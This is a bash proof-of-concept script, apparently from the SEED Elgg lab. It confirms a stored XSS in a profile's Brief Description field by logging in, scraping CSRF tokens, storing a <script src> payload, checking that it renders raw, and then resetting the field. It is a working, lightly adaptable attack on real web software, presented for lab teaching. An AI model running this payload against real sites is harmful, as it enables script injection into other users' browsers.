#!/usr/bin/env bash
# =============================================================================
# elgg_http_poc.sh — HARMLESS, reproducible HTTP-level Stored-XSS proof of concept
# =============================================================================
# What this does (all on an OWNED test account, inside the local lab):
#   1. Logs in as `samy` (samy's OWN account — not a victim's session).
#   2. Measures the real length behaviour of the Brief Description field.
#   3. Stores a HARMLESS payload (a <script src> reference to the lab's demo.js)
#      and shows the server renders it UN-ENCODED (=> Stored XSS).
#   4. RESETS the field to empty, leaving the account clean.
#
# What this deliberately does NOT do:
#   - no friend requests, no self-propagation, no acting through another user's
#     session, no credential/cookie exfiltration. It only edits samy's own
#     profile, exactly as a student would do by hand for the harmless PoC.
#
# Target is fixed to the local SEED lab (10.9.0.5 / www.seed-server.com).
# -----------------------------------------------------------------------------
set -euo pipefail

CONTAINER_IP="${ELGG_CONTAINER_IP:-10.9.0.5}"
HOSTNAME_V="${ELGG_HOSTNAME:-www.seed-server.com}"
BASE="http://${HOSTNAME_V}"
RES=(--resolve "${HOSTNAME_V}:80:${CONTAINER_IP}")
USER_NAME="${ELGG_USER:-samy}"
USER_PASS="${ELGG_PASS:-seedsamy}"     # SEED default for samy; see elgg-lab/README.md
JAR="$(mktemp)"
trap 'rm -f "$JAR"' EXIT

note() { printf '\n=== %s ===\n' "$*"; }

get_token_blob() { curl -s "${RES[@]}" -c "$JAR" -b "$JAR" "$1" | grep -oE '"token":\{[^}]*\}' | head -1; }
ts_of()   { grep -oE '"__elgg_ts":[0-9]+'    <<<"$1" | head -1 | grep -oE '[0-9]+'; }
tok_of()  { grep -oE '"__elgg_token":"[^"]+"' <<<"$1" | head -1 | sed -E 's/.*:"([^"]+)"/\1/'; }

note "1) Login as ${USER_NAME} (own account)"
BLOB="$(get_token_blob "$BASE/")"
curl -s "${RES[@]}" -c "$JAR" -b "$JAR" -L -o /dev/null -w "login http=%{http_code}\n" \
  --data-urlencode "username=${USER_NAME}" \
  --data-urlencode "password=${USER_PASS}" \
  --data-urlencode "__elgg_ts=$(ts_of "$BLOB")" \
  --data-urlencode "__elgg_token=$(tok_of "$BLOB")" \
  "$BASE/action/login"

# Resolve our own guid for the edit form.
GUID="$(curl -s "${RES[@]}" -b "$JAR" "$BASE/" | grep -oE '"user":\{"guid":[0-9]+' | head -1 | grep -oE '[0-9]+')"
echo "logged in as ${USER_NAME}, guid=${GUID:-<unknown>}"

edit_brief() {  # $1 = briefdescription value
  local ef ts tok
  ef="$(curl -s "${RES[@]}" -b "$JAR" "$BASE/profile/${USER_NAME}/edit")"
  ts="$(grep -oE '"__elgg_ts":[0-9]+' <<<"$ef" | head -1 | grep -oE '[0-9]+')"
  tok="$(grep -oE '"__elgg_token":"[^"]+"' <<<"$ef" | head -1 | sed -E 's/.*:"([^"]+)"/\1/')"
  curl -s "${RES[@]}" -b "$JAR" -o /dev/null -w "edit http=%{http_code}\n" \
    --data-urlencode "name=Samy" --data-urlencode "guid=${GUID}" \
    --data-urlencode "briefdescription=$1" \
    --data-urlencode "accesslevel[briefdescription]=2" \
    --data-urlencode "__elgg_ts=${ts}" --data-urlencode "__elgg_token=${tok}" \
    "$BASE/action/profile/edit"
}
read_brief() {
  curl -s "${RES[@]}" -b "$JAR" "$BASE/profile/${USER_NAME}/edit" \
    | grep -oE '<input value="[^"]*" type="text" name="briefdescription"' \
    | sed -E 's/<input value="([^"]*)".*/\1/'
}

note "2) Length behaviour: store 300 chars, read back"
LONG="$(python3 -c "print('LEN>' + ''.join(str(i%10) for i in range(296)))")"
edit_brief "$LONG"
RB="$(read_brief)"
echo "stored read-back length (attribute-escaped) = ${#RB}  -> field accepted a >250-char value"

note "3) Stored XSS: store a harmless <script src> and show raw rendering"
PAYLOAD='XSSLAB-POC<script src="http://localhost:8000/demo.js"></script>'
edit_brief "$PAYLOAD"
if curl -s "${RES[@]}" -b "$JAR" "$BASE/profile/${USER_NAME}" | grep -qF "$PAYLOAD"; then
  echo "RESULT: payload rendered UN-ENCODED in the profile body => STORED XSS CONFIRMED"
else
  echo "RESULT: payload not found raw (field may be encoded in this build) — investigate"
fi

note "4) Reset ${USER_NAME}'s Brief Description to empty (clean up)"
edit_brief ""
echo "briefdescription now = '[$(read_brief)]'"
echo
echo "Done. This PoC modified ONLY ${USER_NAME}'s own profile and reset it."
